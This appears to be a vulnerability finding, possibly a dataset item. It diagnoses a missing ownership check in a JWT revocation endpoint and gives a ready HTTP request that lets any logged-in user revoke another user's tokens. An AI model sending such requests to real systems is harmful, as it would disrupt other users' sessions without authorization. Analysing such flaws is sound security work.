diagnosis: The endpoint blacklists an outstanding JWT by looking up OutstandingToken solely using the URL parameter token_id. It fails to check if token.user_id == request.user.id, allowing any authenticated user to revoke active sessions and refresh tokens of other users.
exploit_request:
POST /api/auth/tokens/5021/revoke/ HTTP/1.1
Host: sso.company.com
Authorization: Bearer <attacker_jwt>
Content-Length: 0
